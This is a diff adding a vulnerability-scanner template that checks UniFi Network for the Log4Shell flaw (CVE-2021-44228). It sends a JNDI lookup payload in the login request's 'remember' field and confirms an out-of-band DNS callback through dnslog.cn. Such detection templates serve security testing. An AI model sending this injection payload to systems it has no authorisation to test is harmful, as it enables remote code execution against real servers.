@@ -1,0 +1,30 @@
+name: UniFi Network Log4shell CVE-2021-44228
+manual: true
+query: ( title="UniFi Network")
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: http://www.dnslog.cn/getdomain.php
+    expression: response.status == 200
+    output:
+      dnstest: response.body
+  r1:
+    request:
+      method: POST
+      path: /api/login
+      body: '{"username":"admin","password":"lolwat","remember":"${jndi:ldap://{{dnstest}}/tea}","strict":true}'
+    expression: response.status >= 200
+  r2:
+    request:
+      method: GET
+      path: http://www.dnslog.cn/getrecords.php
+    expression: response.status == 200 && response.body.bcontains(b"{{dnstest}}")
+expression: r0() && r1() && r2()
+detail:
+  author: aetkrad
+  links:
+  - https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
+  description: UniFi Network 存在log4j漏洞。
+  tags: rce
